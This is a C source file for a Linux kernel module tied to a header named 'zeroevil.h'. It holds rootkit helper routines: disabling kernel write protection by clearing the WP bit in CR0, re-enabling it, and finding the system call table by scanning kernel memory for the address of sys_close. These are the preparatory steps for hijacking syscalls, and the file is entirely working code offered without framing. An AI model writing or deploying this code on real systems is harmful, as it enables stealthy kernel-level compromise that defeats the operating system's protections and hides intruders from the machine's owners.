#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/syscalls.h>
#include "zeroevil.h"
//#include <asm/processor-flags.h>

void disable_wp(void)
{
	unsigned long cr0;

	preempt_disable();
	cr0 = read_cr0();
	clear_bit(16, &cr0);
	write_cr0(cr0);
	preempt_enable();
}

void enable_wp(void)
{
	unsigned long cr0;

	preempt_disable();
	cr0 = read_cr0();
	set_bit(16, &cr0);
	write_cr0(cr0);
	preempt_enable();
}

unsigned long ** get_sct_via_sys_close(void)
{
	unsigned long ** entry = (unsigned long **)PAGE_OFFSET;

	for (; (unsigned long ) entry < ULONG_MAX;entry +=1){
		if(entry[__NR_close] == (unsigned long *) sys_close){
			return entry;
		}
	}

	return NULL;
}

unsigned long ** get_sct(void)
{
	return get_sct_via_sys_close();
}
